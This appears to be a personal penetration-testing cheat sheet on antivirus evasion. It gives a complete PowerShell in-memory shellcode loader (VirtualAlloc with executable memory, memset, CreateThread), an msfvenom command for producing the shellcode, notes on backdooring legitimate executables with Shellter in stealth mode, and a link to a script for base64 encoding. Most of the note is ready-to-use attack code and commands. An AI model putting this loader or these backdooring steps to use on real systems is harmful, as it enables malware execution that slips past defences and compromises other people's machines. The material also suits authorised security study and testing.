---
title: In-Memory Injection
date: M01-29-2023
author: i4
---
#evasion 

## Powershell

```powershell
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

$winFunc = 
  Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;

[Byte[]];
[Byte[]]$sc = <place your shellcode here>;

$size = 0x1000;

if ($sc.Length -gt 0x1000) {$size = $sc.Length};

$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};

$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
```

### Generating Shellcode
```bash
msfvenom -p [payload] [OPTIONS] -f powershell
```

## Shellter
- Allows to backdoor a valid non-malicious executable file with a malicious shellcode payload
- Only supports 32 bit
- Install: `apt install shellter`
- Path needs to be set like `/home/[user]/` for the PE to select
- Stealth mode will attempt to restore the execution flow
- Custom payloads need to terminate by exiting the current thread `EXITFUNC=thread`

### Base64 encode script
https://github.com/darkoperator/powershell_scripts/blob/master/ps_encoder.py


